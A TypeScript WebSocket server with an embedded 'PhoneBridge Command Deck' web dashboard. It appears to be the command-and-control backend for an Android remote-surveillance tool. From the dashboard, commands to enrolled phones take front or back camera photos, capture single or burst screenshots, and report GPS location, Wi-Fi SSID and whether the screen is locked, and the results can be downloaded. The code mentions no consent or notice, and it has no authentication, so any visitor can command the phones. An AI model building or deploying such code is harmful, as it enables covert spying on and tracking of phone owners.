import http from "http";
import { WebSocketServer, WebSocket } from "ws";

const PORT = process.env.PORT ? parseInt(process.env.PORT, 10) : 8080;

interface DeviceLocation {
  latitude: number;
  longitude: number;
  accuracy?: number;
  altitude?: number;
  speed?: number;
  timestamp?: number;
}

interface DeviceTelemetry {
  networkType: string;
  wifiSSID: string;
  totalRamMb: number;
  availRamMb: number;
  usedRamMb: number;
  isLowMem: boolean;
  totalStorageGb: number;
  availStorageGb: number;
  isScreenOn: boolean;
}

interface DeviceInfo {
  manufacturer: string;
  model: string;
  androidVersion: string;
  sdkInt: number;
  batteryLevel?: number;
  isCharging?: boolean;
  location?: DeviceLocation;
  telemetry?: DeviceTelemetry;
  lastCapturedPhoto?: string;
  screenCaptureActive?: boolean;
  lastCapturedScreen?: string;
}

interface ExtWebSocket extends WebSocket {
  isAlive: boolean;
  deviceId?: string;
  clientType?: "PHONE" | "DASHBOARD";
}

const DASHBOARD_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>PhoneBridge Dashboard</title>
  <style>
    * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
    body { background: #0f172a; color: #f8fafc; margin: 0; padding: 24px; }
    header { display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #334155; padding-bottom: 16px; margin-bottom: 24px; }
    h1 { margin: 0; font-size: 22px; font-weight: 700; color: #38bdf8; }
    .status-badge { background: #1e293b; padding: 6px 12px; border-radius: 9999px; font-size: 13px; border: 1px solid #475569; }
    .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(380px, 1fr)); gap: 16px; }
    .card { background: #1e293b; border: 1px solid #334155; border-radius: 12px; padding: 20px; box-shadow: 0 4px 6px rgba(0,0,0,0.3); }
    .card h2 { margin: 0 0 8px 0; font-size: 18px; color: #f1f5f9; }
    .device-meta { font-size: 13px; color: #94a3b8; margin-bottom: 14px; line-height: 1.5; }
    .meta-tag { font-family: monospace; font-size: 11px; background: #0f172a; padding: 2px 6px; border-radius: 4px; }
    
    .telemetry-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 10px; }
    .tele-stat { background: #090d16; border: 1px solid #1e293b; border-radius: 6px; padding: 8px; font-size: 11px; }
    .tele-stat .label { color: #64748b; font-size: 10px; text-transform: uppercase; letter-spacing: 0.5px; }
    .tele-stat .val { color: #f1f5f9; font-weight: 600; font-family: monospace; margin-top: 2px; }

    .loc-box { background: #090d16; border: 1px solid #1e293b; border-radius: 6px; padding: 10px; margin-top: 10px; font-size: 12px; font-family: monospace; color: #38bdf8; }
    .loc-box a { color: #f59e0b; text-decoration: underline; margin-top: 4px; display: inline-block; font-weight: bold; }
    
    .actions { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 16px; }
    button { background: #2563eb; color: white; border: none; padding: 8px 12px; border-radius: 6px; font-size: 12px; font-weight: 500; cursor: pointer; transition: background 0.15s; }
    button:hover { background: #1d4ed8; }
    button.locate { background: #059669; }
    button.locate:hover { background: #047857; }
    button.tele { background: #7c3aed; }
    button.tele:hover { background: #6d28d9; }
    button.cam { background: #0284c7; }
    button.cam:hover { background: #0369a1; }
    button.torch-off { background: #475569; }
    button.torch-off:hover { background: #334155; }
    button.alarm-on { background: #dc2626; }
    button.alarm-on:hover { background: #b91c1c; }
    button.alarm-off { background: #64748b; }
    button.alarm-off:hover { background: #475569; }
    button.screen { background: #0f766e; }
    button.screen:hover { background: #115e59; }
    button.screen-stop { background: #be123c; }
    button.screen-stop:hover { background: #9f1239; }
    .screen-status { margin-top: 10px; padding: 8px 10px; border-radius: 6px; background: #090d16; border: 1px solid #1e293b; font-size: 11px; font-family: monospace; }
    
    .log-box { margin-top: 24px; background: #020617; border: 1px solid #1e293b; border-radius: 8px; padding: 12px; height: 180px; overflow-y: auto; font-family: monospace; font-size: 12px; color: #a5f3fc; }

    .modal-backdrop { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 100; align-items: center; justify-content: center; }
    .modal-backdrop.active { display: flex; }
    .modal-content { background: #1e293b; border: 1px solid #334155; border-radius: 12px; padding: 20px; max-width: 90vw; max-height: 90vh; text-align: center; }
    .modal-content img { max-width: 100%; max-height: 70vh; border-radius: 8px; border: 1px solid #0f172a; object-fit: contain; }
  </style>
</head>
<body>
  <header>
    <h1>PhoneBridge Command Deck</h1>
    <div class="status-badge" id="deckStatus">Connecting to deck...</div>
  </header>

  <main>
    <div class="grid" id="deviceList">
      <div style="color: #64748b; font-size: 14px;">No phones connected yet.</div>
    </div>

    <h3 style="margin-top: 28px; margin-bottom: 8px; font-size: 14px; color: #94a3b8;">Event Activity</h3>
    <div class="log-box" id="activityLog"></div>
  </main>

  <div class="modal-backdrop" id="photoModal" onclick="closePhotoModal()">
    <div class="modal-content" onclick="event.stopPropagation()">
      <h3 id="modalTitle" style="margin-top: 0; color: #f8fafc; font-size: 16px;">Captured Frame</h3>
      <img id="modalImg" src="" alt="Captured Frame" />
      <div style="margin-top: 14px; display: flex; justify-content: space-between; align-items: center;">
        <a id="downloadLink" download="capture.jpg" style="color: #38bdf8; font-size: 13px; text-decoration: none;">Download Image</a>
        <button onclick="closePhotoModal()" style="background: #475569;">Close</button>
      </div>
    </div>
  </div>

  <script>
    const protocol = window.location.protocol === "https:" ? "wss://" : "ws://";
    const ws = new WebSocket(protocol + window.location.host);
    const deviceListEl = document.getElementById("deviceList");
    const deckStatusEl = document.getElementById("deckStatus");
    const activityLogEl = document.getElementById("activityLog");

    function logEvent(text) {
      const line = document.createElement("div");
      line.textContent = "[" + new Date().toLocaleTimeString() + "] " + text;
      activityLogEl.prepend(line);
    }

    function showPhotoModal(title, base64Data) {
      const src = base64Data.startsWith("data:") ? base64Data : "data:image/jpeg;base64," + base64Data;
      document.getElementById("modalTitle").textContent = title;
      const img = document.getElementById("modalImg");
      img.src = src;
      const dl = document.getElementById("downloadLink");
      dl.href = src;
      document.getElementById("photoModal").classList.add("active");
    }

    function closePhotoModal() {
      document.getElementById("photoModal").classList.remove("active");
    }

    ws.onopen = () => {
      deckStatusEl.textContent = "● Deck Connected";
      deckStatusEl.style.borderColor = "#22c55e";
      deckStatusEl.style.color = "#4ade80";
      ws.send(JSON.stringify({ type: "REGISTER_DASHBOARD" }));
      logEvent("Dashboard authenticated with server.");
    };

    ws.onclose = () => {
      deckStatusEl.textContent = "● Deck Offline";
      deckStatusEl.style.borderColor = "#ef4444";
      deckStatusEl.style.color = "#f87171";
      logEvent("Lost connection to server.");
    };

    ws.onmessage = (event) => {
      const msg = JSON.parse(event.data);

      if (msg.type === "DEVICE_UPDATE") {
        renderDevices(msg.devices);
      } else if (msg.type === "ACTIVITY") {
        logEvent(msg.message);
      } else if (msg.type === "PHOTO_RECEIVED") {
        logEvent("Captured photo received from " + msg.deviceId.slice(0, 8) + " (" + msg.lens + ")");
        showPhotoModal("Capture (" + msg.lens + ") - " + msg.deviceId.slice(0, 8), msg.image);
      } else if (msg.type === "SCREENSHOT_RECEIVED") {
        const frameText = msg.total > 1 ? "Frame " + (msg.index + 1) + "/" + msg.total : "Snapshot";
        logEvent("Screen " + frameText.toLowerCase() + " received from " + msg.deviceId.slice(0, 8));
        showPhotoModal("Screen " + frameText + " - " + msg.deviceId.slice(0, 8), msg.image);
      } else if (msg.type === "SCREENSHOT_COMPLETE") {
        logEvent("Screen capture completed on " + msg.deviceId.slice(0, 8) + " (" + msg.total + " frame" + (msg.total === 1 ? "" : "s") + ")");
      } else if (msg.type === "SCREEN_CAPTURE_STATUS") {
        logEvent("Screen capture " + (msg.active ? "started" : "stopped") + " on " + msg.deviceId.slice(0, 8));
      } else if (msg.type === "SCREENSHOT_ERROR") {
        logEvent("Screen capture error from " + msg.deviceId.slice(0, 8) + ": " + msg.error);
      }
    };

    function sendCommand(deviceId, command, options) {
      const payload = {
        type: "DASHBOARD_COMMAND",
        deviceId: deviceId,
        command: command
      };

      if (options) {
        Object.assign(payload, options);
      }

      ws.send(JSON.stringify(payload));
      logEvent("Dispatched " + command + " to " + deviceId.slice(0, 8) + "...");
    }

    function renderDevices(devices) {
      if (devices.length === 0) {
        deviceListEl.innerHTML = '<div style="color: #64748b; font-size: 14px;">No phones connected.</div>';
        return;
      }

      deviceListEl.innerHTML = devices.map(d => {
        const batteryStr = d.batteryLevel !== undefined 
          ? d.batteryLevel + "%" + (d.isCharging ? " (Charging)" : "") 
          : "Unknown";

        const t = d.telemetry;
        const telemetryHtml = t ? \`
          <div class="telemetry-grid">
            <div class="tele-stat">
              <div class="label">Network / SSID</div>
              <div class="val">\${t.networkType} \${t.wifiSSID !== "N/A" ? "(" + t.wifiSSID + ")" : ""}</div>
            </div>
            <div class="tele-stat">
              <div class="label">Screen State</div>
              <div class="val" style="color: \${t.isScreenOn ? '#4ade80' : '#94a3b8'}">\${t.isScreenOn ? "ON (Interactive)" : "OFF (Locked)"}</div>
            </div>
            <div class="tele-stat">
              <div class="label">RAM Usage</div>
              <div class="val">\${t.usedRamMb}MB / \${t.totalRamMb}MB</div>
            </div>
            <div class="tele-stat">
              <div class="label">Free Storage</div>
              <div class="val">\${t.availStorageGb}GB / \${t.totalStorageGb}GB</div>
            </div>
          </div>
        \` : '';

        const locHtml = d.location ? \`
          <div class="loc-box">
            <div>GPS: \${d.location.latitude.toFixed(6)}, \${d.location.longitude.toFixed(6)}</div>
            <div>Accuracy: ±\${d.location.accuracy ? d.location.accuracy.toFixed(1) : "?"}m</div>
            <a href="https://www.google.com/maps?q=\${d.location.latitude},\${d.location.longitude}" target="_blank">Open in Google Maps →</a>
          </div>
        \` : '<div class="loc-box" style="color: #64748b;">GPS: Not acquired yet</div>';

        return \`
          <div class="card">
            <h2>\${d.manufacturer || "Android"} \${d.model || "Device"}</h2>
            <div class="device-meta">
              <div>OS: Android \${d.androidVersion || "?"} (SDK \${d.sdkInt || "?"})</div>
              <div>Battery: \${batteryStr}</div>
              <div style="margin-top: 4px;">ID: <span class="meta-tag">\${d.id}</span></div>
              \${telemetryHtml}
              \${locHtml}
              <div class="screen-status" style="color: \${d.screenCaptureActive ? '#4ade80' : '#94a3b8'}">
                Screen Capture: \${d.screenCaptureActive ? 'ACTIVE' : 'INACTIVE'}
              </div>
            </div>
            <div class="actions">
              <button class="cam" onclick="sendCommand('\${d.id}', 'CAPTURE_PHOTO_BACK')">📸 Back Cam</button>
              <button class="cam" onclick="sendCommand('\${d.id}', 'CAPTURE_PHOTO_FRONT')">🤳 Front Cam</button>
              <button class="tele" onclick="sendCommand('\${d.id}', 'GET_TELEMETRY')">Sync Telemetry</button>
              <button class="locate" onclick="sendCommand('\${d.id}', 'GET_LOCATION')">Locate</button>
              <button onclick="sendCommand('\${d.id}', 'PING')">Ping</button>
              <button onclick="sendCommand('\${d.id}', 'VIBRATE')">Vibrate</button>
              <button onclick="sendCommand('\${d.id}', 'TORCH_ON')">Torch ON</button>
              <button class="torch-off" onclick="sendCommand('\${d.id}', 'TORCH_OFF')">Torch OFF</button>
              <button class="alarm-on" onclick="sendCommand('\${d.id}', 'ALARM_START')">Ring Alarm</button>
              <button class="alarm-off" onclick="sendCommand('\${d.id}', 'ALARM_STOP')">Stop Alarm</button>
              <button class="screen" onclick="sendCommand('\${d.id}', 'SCREENSHOT')">🖥 Snapshot</button>
              <button class="screen" onclick="sendCommand('\${d.id}', 'BURST_SCREENSHOT', { count: 5, intervalMs: 2000 })">🖥 Burst (5)</button>
              <button class="screen-stop" onclick="sendCommand('\${d.id}', 'STOP_SCREEN_CAPTURE')">Stop Screen</button>
            </div>
          </div>
        \`;
      }).join("");
    }
  </script>
</body>
</html>`;

const httpServer = http.createServer((req, res) => {
  if (req.url === "/health") {
    res.writeHead(200, { "Content-Type": "text/plain" });
    res.end("OK");
    return;
  }

  res.writeHead(200, { "Content-Type": "text/html" });
  res.end(DASHBOARD_HTML);
});

const wss = new WebSocketServer({
  server: httpServer,
  maxPayload: 15 * 1024 * 1024,
});

const connectedDevices = new Map<string, ExtWebSocket>();
const deviceRegistry = new Map<string, DeviceInfo>();
const dashboardSockets = new Set<ExtWebSocket>();

function broadcastToDashboards(messageObj: object) {
  const payload = JSON.stringify(messageObj);
  dashboardSockets.forEach((dash) => {
    if (dash.readyState === WebSocket.OPEN) {
      dash.send(payload);
    }
  });
}

function pushDeviceListUpdate() {
  const devices: Array<{ id: string } & Partial<DeviceInfo>> = [];
  connectedDevices.forEach((_, id) => {
    const info = deviceRegistry.get(id) || {
      manufacturer: "Unknown",
      model: "Device",
      androidVersion: "?",
      sdkInt: 0,
    };
    devices.push({ id, ...info });
  });

  broadcastToDashboards({
    type: "DEVICE_UPDATE",
    devices: devices,
  });
}

// Active heartbeat to prune dead sockets every 10 seconds
const pingInterval = setInterval(() => {
  wss.clients.forEach((ws) => {
    const extWs = ws as ExtWebSocket;
    if (extWs.isAlive === false) {
      if (extWs.deviceId && connectedDevices.get(extWs.deviceId) === extWs) {
        connectedDevices.delete(extWs.deviceId);
        deviceRegistry.delete(extWs.deviceId);
        console.log(`[Heartbeat] Removed unresponsive device: ${extWs.deviceId}`);
        pushDeviceListUpdate();
      }
      return extWs.terminate();
    }

    extWs.isAlive = false;
    extWs.ping();
  });
}, 10000);

wss.on("close", () => {
  clearInterval(pingInterval);
});

wss.on("connection", (socket: WebSocket) => {
  const extWs = socket as ExtWebSocket;
  extWs.isAlive = true;

  extWs.on("pong", () => {
    extWs.isAlive = true;
  });

  extWs.on("message", (data) => {
    extWs.isAlive = true;

    try {
      const parsed = JSON.parse(data.toString());

      if (parsed.type === "REGISTER_DASHBOARD") {
        extWs.clientType = "DASHBOARD";
        dashboardSockets.add(extWs);
        console.log("[Deck] Browser dashboard connected.");
        pushDeviceListUpdate();
        return;
      }

      if (parsed.type === "DASHBOARD_COMMAND") {
        const targetId = parsed.deviceId;
        const command = parsed.command;
        const targetSocket = connectedDevices.get(targetId);

        if (!targetSocket || targetSocket.readyState !== WebSocket.OPEN) {
          connectedDevices.delete(targetId);
          deviceRegistry.delete(targetId);
          pushDeviceListUpdate();
          broadcastToDashboards({
            type: "ACTIVITY",
            message: `Command failed: Device ${targetId.slice(0, 8)} is offline.`,
          });
          return;
        }

        const outboundCommand: Record<string, unknown> = {
          type: "COMMAND",
          command: command,
        };

        if (parsed.count !== undefined) {
          outboundCommand.count = parsed.count;
        }

        if (parsed.intervalMs !== undefined) {
          outboundCommand.intervalMs = parsed.intervalMs;
        }

        targetSocket.send(JSON.stringify(outboundCommand));
        console.log(`[Deck -> Phone] Dispatched ${command} to ${targetId}`);
        return;
      }

      if (parsed.type === "REGISTER_DEVICE") {
        extWs.clientType = "PHONE";
        const devId = parsed.deviceId;
        if (!devId) return;

        extWs.deviceId = devId;

        // If an old socket for this device exists, terminate the ghost instance
        const oldSocket = connectedDevices.get(devId);
        if (oldSocket && oldSocket !== extWs) {
          oldSocket.terminate();
        }

        connectedDevices.set(devId, extWs);
        console.log(`Device registered: ${devId}`);

        extWs.send(JSON.stringify({ type: "REGISTRATION_SUCCESS", deviceId: devId }));
        extWs.send(JSON.stringify({ type: "COMMAND", command: "GET_DEVICE_INFO" }));
        extWs.send(JSON.stringify({ type: "COMMAND", command: "GET_BATTERY" }));

        pushDeviceListUpdate();
        broadcastToDashboards({
          type: "ACTIVITY",
          message: `Device connected: ${devId.slice(0, 8)}...`,
        });
        return;
      }

      if (parsed.type === "DEVICE_INFO" && extWs.deviceId) {
        const devId = extWs.deviceId;
        const current = deviceRegistry.get(devId) || {
          manufacturer: parsed.manufacturer,
          model: parsed.model,
          androidVersion: parsed.androidVersion,
          sdkInt: parsed.sdkInt,
        };
        current.manufacturer = parsed.manufacturer;
        current.model = parsed.model;
        current.androidVersion = parsed.androidVersion;
        current.sdkInt = parsed.sdkInt;
        deviceRegistry.set(devId, current);

        pushDeviceListUpdate();
        return;
      }

      if (parsed.type === "BATTERY_INFO" && extWs.deviceId) {
        const devId = extWs.deviceId;
        const current = deviceRegistry.get(devId) || {
          manufacturer: "Unknown",
          model: "Device",
          androidVersion: "?",
          sdkInt: 0,
        };
        current.batteryLevel = parsed.level;
        current.isCharging = parsed.isCharging;
        deviceRegistry.set(devId, current);

        pushDeviceListUpdate();
        return;
      }

      if (parsed.type === "TELEMETRY_DATA" && extWs.deviceId) {
        const devId = extWs.deviceId;
        const current = deviceRegistry.get(devId) || {
          manufacturer: "Unknown",
          model: "Device",
          androidVersion: "?",
          sdkInt: 0,
        };
        current.telemetry = {
          networkType: parsed.networkType,
          wifiSSID: parsed.wifiSSID,
          totalRamMb: parsed.totalRamMb,
          availRamMb: parsed.availRamMb,
          usedRamMb: parsed.usedRamMb,
          isLowMem: parsed.isLowMem,
          totalStorageGb: parsed.totalStorageGb,
          availStorageGb: parsed.availStorageGb,
          isScreenOn: parsed.isScreenOn,
        };
        deviceRegistry.set(devId, current);

        pushDeviceListUpdate();
        broadcastToDashboards({
          type: "ACTIVITY",
          message: `Telemetry synced from ${devId.slice(0, 8)}: ${parsed.networkType}, RAM: ${parsed.usedRamMb}/${parsed.totalRamMb}MB`,
        });
        return;
      }

      if (parsed.type === "LOCATION_DATA" && extWs.deviceId) {
        const devId = extWs.deviceId;
        const current = deviceRegistry.get(devId) || {
          manufacturer: "Unknown",
          model: "Device",
          androidVersion: "?",
          sdkInt: 0,
        };
        current.location = {
          latitude: parsed.latitude,
          longitude: parsed.longitude,
          accuracy: parsed.accuracy,
          altitude: parsed.altitude,
          speed: parsed.speed,
          timestamp: parsed.timestamp,
        };
        deviceRegistry.set(devId, current);

        pushDeviceListUpdate();
        broadcastToDashboards({
          type: "ACTIVITY",
          message: `Location received from ${devId.slice(0, 8)}: ${parsed.latitude.toFixed(4)}, ${parsed.longitude.toFixed(4)}`,
        });
        return;
      }

      if ((parsed.type === "PHOTO_DATA" || parsed.type === "IMAGE_CAPTURE") && extWs.deviceId) {
        const devId = extWs.deviceId;
        const base64Image = parsed.image || parsed.data || parsed.base64;
        const lensFacing = parsed.lens || parsed.camera || "CAMERA";

        if (base64Image) {
          const current = deviceRegistry.get(devId);
          if (current) {
            current.lastCapturedPhoto = base64Image;
          }

          broadcastToDashboards({
            type: "PHOTO_RECEIVED",
            deviceId: devId,
            lens: lensFacing,
            image: base64Image,
          });

          broadcastToDashboards({
            type: "ACTIVITY",
            message: `Photo captured via ${lensFacing} by ${devId.slice(0, 8)}`,
          });
        }
        return;
      }

      if (parsed.type === "SCREEN_CAPTURE_STATUS" && extWs.deviceId) {
        const devId = extWs.deviceId;
        const current = deviceRegistry.get(devId) || {
          manufacturer: "Unknown",
          model: "Device",
          androidVersion: "?",
          sdkInt: 0,
        };

        current.screenCaptureActive = Boolean(parsed.active);
        deviceRegistry.set(devId, current);
        pushDeviceListUpdate();

        broadcastToDashboards({
          type: "SCREEN_CAPTURE_STATUS",
          deviceId: devId,
          active: Boolean(parsed.active),
        });

        broadcastToDashboards({
          type: "ACTIVITY",
          message: `Screen capture ${parsed.active ? "started" : "stopped"} on ${devId.slice(0, 8)}`,
        });
        return;
      }

      if (parsed.type === "SCREENSHOT_DATA" && extWs.deviceId) {
        const devId = extWs.deviceId;
        const base64Image = parsed.image || parsed.data || parsed.base64;

        if (base64Image) {
          const current = deviceRegistry.get(devId) || {
            manufacturer: "Unknown",
            model: "Device",
            androidVersion: "?",
            sdkInt: 0,
          };

          current.lastCapturedScreen = base64Image;
          deviceRegistry.set(devId, current);

          broadcastToDashboards({
            type: "SCREENSHOT_RECEIVED",
            deviceId: devId,
            index: Number.isFinite(parsed.index) ? parsed.index : 0,
            total: Number.isFinite(parsed.total) ? parsed.total : 1,
            image: base64Image,
            timestamp: parsed.timestamp,
          });
        }
        return;
      }

      if (parsed.type === "SCREENSHOT_COMPLETE" && extWs.deviceId) {
        const devId = extWs.deviceId;
        const total = Number.isFinite(parsed.total) ? parsed.total : 1;

        broadcastToDashboards({
          type: "SCREENSHOT_COMPLETE",
          deviceId: devId,
          total: total,
          timestamp: parsed.timestamp,
        });

        broadcastToDashboards({
          type: "ACTIVITY",
          message: `Screen capture completed on ${devId.slice(0, 8)} (${total} frame${total === 1 ? "" : "s"})`,
        });
        return;
      }

      if (parsed.type === "SCREENSHOT_ERROR" && extWs.deviceId) {
        const devId = extWs.deviceId;
        const error = parsed.error || "Unknown screen capture error";

        broadcastToDashboards({
          type: "SCREENSHOT_ERROR",
          deviceId: devId,
          error: error,
        });

        broadcastToDashboards({
          type: "ACTIVITY",
          message: `Screen capture error from ${devId.slice(0, 8)}: ${error}`,
        });
        return;
      }

      if (parsed.type === "CAMERA_ERROR" && extWs.deviceId) {
        broadcastToDashboards({
          type: "ACTIVITY",
          message: `Camera error from ${extWs.deviceId.slice(0, 8)}: ${parsed.error}`,
        });
        return;
      }

      if (parsed.type === "LOCATION_ERROR" && extWs.deviceId) {
        broadcastToDashboards({
          type: "ACTIVITY",
          message: `Location failed for ${extWs.deviceId.slice(0, 8)}: ${parsed.error}`,
        });
        return;
      }

      if (parsed.type === "COMMAND_ACK" && extWs.deviceId) {
        broadcastToDashboards({
          type: "ACTIVITY",
          message: `Device ${extWs.deviceId.slice(0, 8)} completed ${parsed.command} (${parsed.status})`,
        });
        return;
      }

      if (parsed.type === "PONG" && extWs.deviceId) {
        broadcastToDashboards({
          type: "ACTIVITY",
          message: `Pong received from ${extWs.deviceId.slice(0, 8)} - Online`,
        });
        return;
      }
    } catch (err) {
      console.error("Failed to parse incoming WS message:", err);
    }
  });

  socket.on("close", () => {
    if (extWs.clientType === "DASHBOARD") {
      dashboardSockets.delete(extWs);
      console.log("[Deck] Browser dashboard disconnected.");
    } else if (extWs.deviceId) {
      const devId = extWs.deviceId;
      if (connectedDevices.get(devId) === extWs) {
        connectedDevices.delete(devId);
        deviceRegistry.delete(devId);
        console.log(`Device disconnected: ${devId}`);
        pushDeviceListUpdate();
        broadcastToDashboards({
          type: "ACTIVITY",
          message: `Device disconnected: ${devId.slice(0, 8)}...`,
        });
      }
    }
  });

  socket.on("error", (err) => {
    console.error("Socket error encountered:", err);
  });
});

httpServer.listen(PORT, () => {
  console.log(`PhoneBridge server & dashboard running on port ${PORT}`);
});